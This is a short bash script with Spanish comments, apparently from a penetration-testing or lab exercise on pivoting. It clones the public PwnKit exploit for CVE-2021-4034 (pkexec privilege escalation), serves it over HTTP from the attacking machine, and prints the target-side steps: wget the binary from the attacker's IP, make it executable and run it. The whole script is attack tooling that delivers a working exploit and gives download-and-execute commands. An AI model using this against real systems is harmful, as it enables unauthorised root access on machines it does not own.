#!/bin/bash
# 03_pwnkit_setup.sh
# Prepara y sirve el exploit PwnKit (CVE-2021-4034) para escalada
# de privilegios via pkexec <= 0.105.
#
# Ejecuta esto en la maquina ATACANTE (o en la maquina pivote que
# tenga acceso HTTP saliente hacia la maquina objetivo).
#
# Uso:
#   ./03_pwnkit_setup.sh <directorio_trabajo> [puerto_http]
#
# Ejemplo:
#   ./03_pwnkit_setup.sh ./pivoting/vm1 8080
#
# Tras ejecutar este script, desde la shell de la maquina objetivo:
#   wget http://<IP_SERVIDOR>:<PUERTO>/PwnKit/PwnKit
#   chmod +x PwnKit
#   ./PwnKit

set -euo pipefail

WORKDIR="${1:?Uso: $0 <directorio_trabajo> [puerto_http]}"
PORT="${2:-8080}"

mkdir -p "$WORKDIR"
cd "$WORKDIR"

if [ ! -d "PwnKit" ]; then
    echo "[*] Clonando PwnKit..."
    git clone https://github.com/ly4k/PwnKit.git
fi

cd PwnKit
echo "[*] Comprobando arquitectura del binario:"
file PwnKit || true

cd ..
echo
echo "[*] Sirviendo $(pwd) en el puerto $PORT ..."
echo "[*] Desde la maquina objetivo:"
echo "    wget http://<ESTA_IP>:${PORT}/PwnKit/PwnKit"
echo "    chmod +x PwnKit && ./PwnKit"
echo
python3 -m http.server "$PORT"
